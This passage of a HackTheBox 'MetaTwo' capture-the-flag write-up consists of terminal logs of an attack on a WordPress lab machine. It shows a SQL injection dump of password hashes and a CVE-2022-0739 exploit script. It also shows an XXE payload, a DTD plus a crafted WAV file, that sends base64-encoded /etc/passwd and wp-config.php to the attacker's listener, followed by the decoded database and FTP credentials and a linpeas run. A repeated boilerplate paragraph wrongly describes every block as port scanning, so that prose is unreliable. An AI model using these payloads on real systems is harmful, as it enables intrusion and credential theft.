| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[04:55:41] [INFO] table 'blog.wp_users' dumped to CSV file '/home/n0z0/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[04:55:41] [INFO] fetched data logged to text files under '/home/n0z0/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 04:55:41 /2025-03-07/

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
❌[CPU:1][MEM:44][IP:dead:beef:2::1027][...s/wordpress/CVE-2022-0739]
🐉 bash ./exploit.sh 'http://metapress.htb/events/'
    ____              __   _             ____                     
   / __ )____  ____  / /__(_)___  ____ _/ __ \________  __________
  / __  / __ \/ __ \/ //_/ / __ \/ __ `/ /_/ / ___/ _ \/ ___/ ___/
 / /_/ / /_/ / /_/ / ,< / / / / / /_/ / ____/ /  /  __(__  |__  ) 
/_____/\____/\____/_/|_/_/_/ /_/\__, /_/   /_/   \___/____/____/  
                               /____/                             
   _______    ________    ___   ____ ___  ___        ____  __________ ____ 
  / ____/ |  / / ____/   |__ \ / __ \__ \|__ \      / __ \/__  /__  // __ \
 / /    | | / / __/________/ // / / /_/ /__/ /_____/ / / /  / / /_ </ /_/ /
/ /___  | |/ / /__/_____/ __// /_/ / __// __/_____/ /_/ /  / /___/ /\__, / 
\____/  |___/_____/    /____/\____/____/____/     \____/  /_//____//____/  

[+] Exploiting http://metapress.htb ...
[+] Vulnerable url at http://metapress.htb/events/...
[+] Gettting nonce...
[+] Found nonce: 546ff9a61e
[+] Extract database name...

information_schema
blog

[+] Getting creds...
admin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager $P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:8][MEM:46][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 cat xxe.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.41:3333/?p=%file;'>" >

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
❌[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.41:3333/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > xxe.wav  

✅[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 vi xxe.dtd 

✅[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 php -S 0.0.0.0:3333
[Tue Mar  4 02:26:57 2025] PHP 8.2.27 Development Server (http://0.0.0.0:3333) started
[Tue Mar  4 02:29:04 2025] 10.129.228.95:53028 Accepted
[Tue Mar  4 02:29:04 2025] 10.129.228.95:53028 [200]: GET /xxe.dtd
[Tue Mar  4 02:29:04 2025] 10.129.228.95:53028 Closing
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53038 Accepted
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53038 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory                                                                                                                
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53038 Closing
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53050 Accepted
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53050 [200]: GET /xxe.dtd
[Tue Mar  4 02:29:05 2025] 10.129.228.95:53050 Closing
[Tue Mar  4 02:29:06 2025] 10.129.228.95:53054 Accepted
[Tue Mar  4 02:29:06 2025] 10.129.228.95:53054 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory                                                                                                                
[Tue Mar  4 02:29:06 2025] 10.129.228.95:53054 Closing

ls
c^C                                                                                                                                                      
✅[CPU:2][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 ls -la
合計 32
drwxrwxr-x 2 n0z0 n0z0 4096  3月  4 02:26 .
drwxrwxr-x 3 n0z0 n0z0 4096  3月  3 23:59 ..
-rw-rw-r-- 1 n0z0 n0z0   98  3月  4 02:18 decrypt.php
-rw-rw-r-- 1 n0z0 n0z0  187  3月  4 02:23 evil.dtd
-rw-rw-r-- 1 n0z0 n0z0   35  3月  4 00:02 hash.txt
-rw-rw-r-- 1 n0z0 n0z0  149  3月  4 02:13 malicious.wav
-rw-rw-r-- 1 n0z0 n0z0  168  3月  4 02:26 xxe.dtd
-rw-rw-r-- 1 n0z0 n0z0  138  3月  4 02:26 xxe.wav

✅[CPU:2][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 vi paswd.txt            

✅[CPU:2][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 base64 -d paswd.txt 
base64: 無効な入力

❌[CPU:2][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 vi paswd.txt       

✅[CPU:2][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 base64 -d paswd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
base64: 無効な入力

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:3][MEM:46][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 echo 'PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==' |base64 -d
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
./linpeas.sh
```

```bash
jnelson@meta2:/tmp$ ./linpeas.sh 

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                               
    |---------------------------------------------------------------------------------|                                                               
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |                                                              
    |         Follow on Twitter         :     @hacktricks_live                        |                                                               
    |         Respect on HTB            :     SirBroccoli                             |                                                               
    |---------------------------------------------------------------------------------|                                                               
    |                                 Thank you!                                      |                                                               
    \---------------------------------------------------------------------------------/                                                               
          LinPEAS-ng by carlospolop                                                                                                                   

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                  

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                              
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                   
                               ╚═══════════════════╝                                                                                                  
OS: Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.149-2 (2022-10-21)
User & Groups: uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
Hostname: meta2

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                     

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                    
                              ╚════════════════════╝                                                                                                  
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                     
Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.149-2 (2022-10-21)
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                        
Sudo version 1.9.5p2                                                                                                                                  

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                
